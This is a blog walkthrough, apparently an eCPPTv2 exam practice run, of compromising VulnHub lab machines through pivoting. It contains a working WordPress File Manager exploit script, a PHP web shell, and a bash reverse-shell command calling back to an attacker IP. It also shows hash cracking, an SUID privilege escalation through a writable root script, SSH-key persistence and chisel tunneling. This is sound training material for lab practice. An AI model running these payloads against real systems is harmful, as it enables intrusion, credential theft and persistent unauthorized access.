<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-02-23T18:30:47-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Arc4he.io</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><entry><title type="html">eCPPTv2 Simulation</title><link href="http://localhost:4000/eCPPTv2-simulation/" rel="alternate" type="text/html" title="eCPPTv2 Simulation" /><published>2024-08-17T00:00:00-06:00</published><updated>2024-08-17T00:00:00-06:00</updated><id>http://localhost:4000/eCPPTv2-simulation</id><content type="html" xml:base="http://localhost:4000/eCPPTv2-simulation/"><![CDATA[<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/certificate-eCPPTv2.png" alt="" /></p>

<p>This time we will perform a simulation of the eCPPTv2 exam, in which we will have to compromise an entire network of computers using <strong>Pivoting</strong>, all in a local environment using VMware.</p>

<p>Machines links:</p>

<ol>
  <li><a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">Aragog</a></li>
  <li><a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">Nagini</a></li>
  <li><a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">Fawkes</a></li>
  <li><a href="https://www.vulnhub.com/entry/matrix-1,259/">Matrix 1</a></li>
  <li><a href="https://www.vulnhub.com/entry/brainpan-1,51/">Brainpan</a></li>
</ol>

<p>We start with the configuration:</p>

<ol>
  <li>Network Configuration =&gt; Vmware &gt; Edit &gt; Virtual Network Editor
We have to add new network interfaces to be able to create the subnets, below you will see an image with the ones you have to create and the IP addresses:</li>
</ol>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/network_editor.png" alt="" /></p>

<ol>
  <li>To each machine we have to add it to a network so that the networks can be seen and separated, for this I will attach an image of the configuration of each machine:</li>
</ol>

<p>Aragog</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/aragog_network.png" alt="" /></p>

<p>Nagini</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/Nagini_network.png" alt="" /></p>

<p>Fawkes</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/fawkes-network.png.png" alt="" /></p>

<p>Matrix</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/matrix-network.png" alt="" /></p>

<p>Brainpan</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/brainpan-network.png" alt="" /></p>

<p>After performing this configuration in <strong>Vmware</strong> we have to go to each machine except the <strong>Matrix</strong> <strong>Brainpan</strong> and when entering the <strong>group</strong> of the machine, press <strong>e</strong> to enter the following interface and enter the following command to grant us a root password</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/rw_init.png" alt="" /></p>

<p>Then we have to do the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /etc/network/interfaces
</code></pre></div></div>

<p>Fawkes</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/interfaces-conf.png" alt="" /></p>

<p>Nagini, Aragog</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/interfaces-whit-two-interface.png" alt="" /></p>

<p>So, with all the machines except the ones mentioned above, we finally reboot them and we can start compromising the machines.</p>

<h1 id="aragog">Aragog</h1>

<h2 id="scanreport">ScanReport</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Sat Aug 17 12:38:26 2024 as: nmap -sCV -p22,80 -oN target 192.168.1.24
Nmap scan report for 192.168.1.24
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:76:EA:DC (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 17 12:38:33 2024 -- 1 IP address (1 host up) scanned in 6.86 seconds
</code></pre></div></div>

<p>Now we did an exhaustive scan on the web but as we can see there is nothing but an image so we have done some fuzzing to find directories inside the web:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://192.168.1.31 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.31
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--&gt; http://192.168.1.31/blog/]
/javascript           (Status: 301) [Size: 317] [--&gt; http://192.168.1.31/javascript/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://192.168.1.31/blog -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -x php,php.bak -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.31/blog
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php.bak,php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php/                (Status: 403) [Size: 277]
/index.php/           (Status: 301) [Size: 0] [--&gt; http://192.168.1.31/blog/]
/wp-content/          (Status: 403) [Size: 277]
/wp-login.php/        (Status: 200) [Size: 3328]
/wp-includes/         (Status: 403) [Size: 277]
/wp-trackback.php/    (Status: 200) [Size: 135]
/wp-admin/            (Status: 302) [Size: 0] [--&gt; http://wordpress.aragog.hogwarts/blog/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.31%2Fblog%2Fwp-admin%2F&amp;reauth=1]
/xmlrpc.php/          (Status: 405) [Size: 42]
/.php/                (Status: 403) [Size: 277]
/wp-signup.php/       (Status: 302) [Size: 0] [--&gt; http://wordpress.aragog.hogwarts/blog/wp-login.php?action=register]
Progress: 474226 / 661683 (71.67%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 475251 / 661683 (71.82%)
===============================================================
Finished
===============================================================
</code></pre></div></div>

<p>If we try to get into the paths that <strong>gobuster</strong> has loaded, it won’t let us, so we have to add <strong>wordpress.aragog.hogwarts</strong> to our <strong>/etc/hosts</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.1.24 wordpress.aragog.hogwarts 
</code></pre></div></div>

<p>At this point to go faster we will use <strong>wpscan</strong> to search for vulnerabilities in this wordpress, remember that you will need a valid token from the wpscan site.</p>

<p>In the wpscan report we can see a lot of information and vulnerabilities but we will focus on <strong>Unanauthenticated Arbitrary File Upload leading to RCE</strong>, because it is the most critical one since being able to execute commands without authentication is quite critical.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
</code></pre></div></div>

<p>In the first link we can see the exploit for this vulnerability, this is the exploit:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
import argparse
import sys

import requests  # python-requests, eg. apt-get install python3-requests


def exploit(url):
    full_url = f'{url}/wp-content/plugins/wp-file-manager/lib/php/' + \
               'connector.minimal.php'

    # Entry point is lib/php/connector.minimal.php, which then loads
    # elFinderConnector from file `lib/php/elFinderConnector.class.php`,
    # which then processes our input
    #
    data = {
        'cmd': 'upload',
        'target': 'l1_',
        'debug': 1,
    }
    files = {
        'upload[0]': open('payload.php', 'rb'),
    }

    print(f"Just do it... URL: {full_url}")
    res = requests.post(full_url, data=data, files=files, verify=False)
    print(res.status_code)
    if res.status_code == requests.codes.ok:
        print("Success!?")
        d = res.json()
        p = d.get('added', [])[0].get('url')
        print(f'{url}{p}')
    else:
        print("fail")
        return 1
    return 0


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help="Full URL to the WordPress site " +
                                    "with vulnerable plugin")
    args = parser.parse_args()

    if not args.url.startswith('http'):
        raise ValueError(f"Invalid URL: {args.url}")

    return exploit(args.url)


if __name__ == '__main__':
    sys.exit(main())

</code></pre></div></div>

<p>First we have to create a payload.php file with malicious php script so that we can execute commands.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
    echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;"
?&gt;
</code></pre></div></div>

<p>Now we can run exploit to put malicious payload.php file on wordpress server and then execute system commands.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
Just do it... URL: http://wordpress.aragog.hogwarts/blog//wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
200
Success!?
http://wordpress.aragog.hogwarts/blog//blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php
</code></pre></div></div>

<p>Now we can try to execute system commands in the following path:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://wordpress.aragog.hogwarts/blog//wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami
</code></pre></div></div>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/command-exectution.png" alt="" /></p>

<p>Finally, we can run the bash command to obtain revershell</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://wordpress.aragog.hogwarts/blog//wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.21/443%200%3E%261%22
</code></pre></div></div>

<p>Result:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 46324
bash: cannot set terminal process group (743): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
www-data
</code></pre></div></div>
<p>At this point we have to do a tty treatment because this shell is limited and not comfortable.</p>

<p>link to learn: <a href="https://invertebr4do.github.io/tratamiento-de-tty/">tty tratament</a></p>

<h2 id="got-root">Got Root</h2>

<p>At this point we are <strong>www-data</strong> user, in this case as wordpress is running it is interesting to look for the <strong>wp-config.php</strong> file because it usually has the credentials for the database.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither &lt;b&gt;$debian_file&lt;/b&gt; nor &lt;b&gt;$debian_main_file&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/userna$
    exit(1);
}
</code></pre></div></div>

<p>But in this case no credentials were found but a path that can have credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?&gt;
</code></pre></div></div>

<p>At this point try to connect in mysql database:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -q root                
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
bash-5.0$ mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'database' at line 1
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
bash-5.0$ mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 44
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [(none)]&gt; use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
13 rows in set (0.000 sec)

MariaDB [wordpress]&gt; select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
</code></pre></div></div>
<p>At this point we can try carack the password encrypted</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john -w:/usr/share/wordlists/rockyou.txt hash.txt

john hash.txt --show
?:password123

1 password hash cracked, 0 left
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ su hagrid98
Password: 
bash-5.0$ whoami
hagrid98
bash-5.0$ 
</code></pre></div></div>

<p>Now we are hagrid98 and we finally have to find a way to be root. After some time searching with different methods to find something that can expolotar we see that there is something unusual.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ find / -writable 2&gt; /dev/null 

/proc/1469/setgroups
/proc/1469/timerslack_ns
/opt/.backup.sh
</code></pre></div></div>

<p>/opt/.backup.sh</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
</code></pre></div></div>

<p>This script creates a recursive copy of the directory <strong>/usr/share/wordpress/wp-content/uploads/</strong> in /tmp, then this script is getionationed by root. To excalate our privileges we can try to modify this script since we have write permissions.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
chmod u+s /bin/bash
</code></pre></div></div>

<p>Then we wait until we see the permission of the <strong>/bin/bash</strong> change</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>watch -n 1 ls -la /bin/bash
</code></pre></div></div>

<p>After some time we can see that you already have the SUID permit.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
bash-5.0$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -p

bash-5.0# whoami
root
bash-5.0# cat /root/
.bash_history     .bashrc           .gnupg/           horcrux2.txt      hostDiscovery.sh  .local/           .profile          .selected_editor  .ssh/             
bash-5.0# cat /root/horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

bash-5.0# 

</code></pre></div></div>

<h1 id="nagini">Nagini</h1>

<p>At this point we only have access on the Aragog machine but we don’t see the Nagini machine. To get this visibility we need to add some configurations, we need to install <strong>chisel</strong> you can find this binary in github.</p>

<p>Before doing anything else, it is important to run the bash script that we have created to analyze the computers that are on the other interface:</p>

<p>Source code</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

## SIGINT

cleanup(){

        echo -e "\nBYE..\n"
        exit 1
}


trap cleanup SIGINT


## Taget 10.10.0.128

echo -e "\nScanning in the network...\n"

for ipAddress in $(seq 1 254); do
        for port in 21 22 80 443 445 8080; do

                timeout 1 bash -c "echo '' &gt; /dev/tcp/10.10.0.$ipAddress/$port" &amp;&gt; /dev/null &amp;&amp; echo "[+] Host: 10.10.0.$ipAddress - PORT $port - OPEN" &amp;
        done
done; wait

echo -e "\n All Already :)\n"
</code></pre></div></div>

<p>Output</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aragog:~# bash hostDiscovery.sh 

Scanning in the network...

[+] Host: 10.10.0.1 - PORT 445 - OPEN
[+] Host: 10.10.0.128 - PORT 22 - OPEN
[+] Host: 10.10.0.128 - PORT 80 - OPEN
[+] Host: 10.10.0.129 - PORT 22 - OPEN
[+] Host: 10.10.0.129 - PORT 80 - OPEN

 All Already :)
</code></pre></div></div>

<p>On our machine we need to run a chisel server on any port:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server --reverse -p 1234
2024/08/25 18:33:50 server: Reverse tunnelling enabled
2024/08/25 18:33:50 server: Fingerprint RbT7IHdkftHEbZ5lMa1fX/lYwtknGkM5SjVK6JjTh0M=
2024/08/25 18:33:50 server: Listening on http://0.0.0.0:1234
2024/08/25 18:33:53 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
</code></pre></div></div>

<p>We use <strong>–reverse</strong> to access the clinet machine.</p>

<p>On client machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aragog:~# ./chisel client 192.168.1.21:1234 R:socks
2024/08/25 22:03:53 client: Connecting to ws://192.168.1.21:1234
2024/08/25 22:03:53 client: Connected (Latency 675.044µs)

</code></pre></div></div>

<p>we use <strong>R:socks</strong> to create a reverse SOCKS5 tunnel. The <strong>R</strong> indicates that it is a reverse tunnel, i.e. the server accesses through the tunnel to the resources available on the client.</p>

<p>Two important things:</p>

<p>The first one when we have access on the machine we need to put our public key in the file <strong>~/.ssh/authorized_keys</strong>, to always have access on the machine.</p>

<p>The second thing is when we need to transfer binary or casual files we can use <strong>scp</strong> , as well:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp text.txt root@192.168.1.31:/tmp/

text.txt                                                                                                                                              100%    5     3.9KB/s   00:00 
</code></pre></div></div>

<p>When we receive the connection, we are ready for the next step, the configuration in the <strong>/etc/proxychains.conf</strong> file. We need the add the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain 

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050

# socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
</code></pre></div></div>

<h2 id="scanreport-1">ScanReport</h2>

<p>To check if we have connection on the other interface we can try to do nmap scan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -T5 -n -v 10.10.0.128 2&gt;&amp;1 | grep "tcp open"
22/tcp open  ssh
80/tcp open  http

</code></pre></div></div>

<p>When we make nmap scan using proxychains we need to have two parameters for it to work = &gt; -sT(TCP scan), -Pn(No host discovery). We finally use xargs to have 500 threads for more speed</p>

<p>To view the web server we need to do the following:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/foxyproxy-nagini.png" alt="" /></p>

<p>We can see the Nagini web server:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/web-server-nagini.png" alt="" /></p>

<p>At this point we will use <strong>gobuster</strong> for fuzzing:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.0.129/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,php --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.129/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 311] [--&gt; http://10.10.0.129/joomla/]
/.php                 (Status: 403) [Size: 276]
Progress: 159687 / 661683 (24.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 160792 / 661683 (24.30%)
</code></pre></div></div>

<p>We can see <strong>note.txt</strong>, let’s take a look:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/note-txt.png" alt="" /></p>

<p>Then to see this announcements we will need to install <strong>quiche</strong>, like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1- git clone --recursive https://github.com/cloudflare/quiche 
2- cd quiche 
3- git checkout -b FixHTTP3 a22bb4b3cb474425764cb7d7b6abd112824994a2 
4- cargo build --examples 
</code></pre></div></div>

<p>Luego tenemos que cambiar <strong>./cliente de chisel</strong> para ver el anuncio en el servidor web http3, like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 192.168.1.21:1234 R:socks R:443:10.10.0.129:443/udp
2024/08/26 00:04:04 client: Connecting to ws://192.168.1.21:1234
2024/08/26 00:04:04 client: Connected (Latency 554.118µs)

</code></pre></div></div>

<p>To bring us the port 443 of the Nagini machine. Finally we can execute the following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./target/debug/examples/http3-client https://127.0.0.1
&lt;html&gt;
	&lt;head&gt;
	&lt;title&gt;Information Page&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>Something it tells us is that there is a hidden directory, we visit this directorio and see the following:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/ssrf-server.png" alt="" /></p>

<p>Now the first thing we think about is to try to make the request on the localhost or on the Aragog machine, and it worked:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/ssrf-test.png" alt="" /></p>

<p>It looks like we are dealing with an <strong>SSRF(Server Side Request Forgery)</strong>, at this point we try to upload a malicious php file, but it does not work, the php script is not executed.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/php-noexecute.png" alt="" /></p>

<p>We have seen before that there is a <strong>joomla</strong> so we are going to fuzz it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.0.129/joomla/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x txt,php,php.bak --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.129/joomla/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,php.bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 318] [--&gt; http://10.10.0.129/joomla/images/]
/index.php            (Status: 200) [Size: 6653]
/media                (Status: 301) [Size: 317] [--&gt; http://10.10.0.129/joomla/media/]
/templates            (Status: 301) [Size: 321] [--&gt; http://10.10.0.129/joomla/templates/]
/modules              (Status: 301) [Size: 319] [--&gt; http://10.10.0.129/joomla/modules/]
/bin                  (Status: 301) [Size: 315] [--&gt; http://10.10.0.129/joomla/bin/]
/plugins              (Status: 301) [Size: 319] [--&gt; http://10.10.0.129/joomla/plugins/]
/includes             (Status: 301) [Size: 320] [--&gt; http://10.10.0.129/joomla/includes/]
/language             (Status: 301) [Size: 320] [--&gt; http://10.10.0.129/joomla/language/]
/README.txt           (Status: 200) [Size: 4793]
/components           (Status: 301) [Size: 322] [--&gt; http://10.10.0.129/joomla/components/]
/cache                (Status: 301) [Size: 317] [--&gt; http://10.10.0.129/joomla/cache/]
/libraries            (Status: 301) [Size: 321] [--&gt; http://10.10.0.129/joomla/libraries/]
/robots.txt           (Status: 200) [Size: 748]
/tmp                  (Status: 301) [Size: 315] [--&gt; http://10.10.0.129/joomla/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 319] [--&gt; http://10.10.0.129/joomla/layouts/]
/administrator        (Status: 301) [Size: 325] [--&gt; http://10.10.0.129/joomla/administrator/]
/configuration.php.bak (Status: 200) [Size: 1978]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 3407]
/cli                  (Status: 301) [Size: 315] [--&gt; http://10.10.0.129/joomla/cli/]
Progress: 155345 / 5095336 (3.05%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 155715 / 5095336 (3.06%)
</code></pre></div></div>

<p>We have found configuration.php.bak, let’s have a look at it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   1   │ &lt;?php
   2   │ class JConfig {
   3   │     public $offline = '0';
   4   │     public $offline_message = 'This site is down for maintenance.&lt;br /&gt;Please check back again soon.';
   5   │     public $display_offline_message = '1';
   6   │     public $offline_image = '';
   7   │     public $sitename = 'Joomla CMS';
